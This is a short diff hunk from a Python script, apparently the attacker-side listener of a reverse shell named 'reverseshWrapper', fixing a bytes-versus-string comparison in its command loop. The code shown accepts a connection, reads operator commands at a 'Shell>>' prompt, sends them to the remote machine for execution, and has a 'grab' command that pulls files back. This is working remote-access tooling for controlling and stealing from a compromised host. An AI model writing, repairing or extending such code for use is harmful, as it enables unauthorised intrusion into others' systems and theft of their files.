@@ -30,11 +30,11 @@ def reverseshWrapper():
     print(color_c + "Connection from " + str(addr))
     while True:
         command = input("Shell>> ")
-        if b'terminate' in command:
+        if 'terminate' in command:
             conn.send(b'terminate')
             conn.close()
             break
-        elif b'grab' in command:
+        elif 'grab' in command:
             transfer(conn, command.encode())
         else:
             conn.send(command.encode())
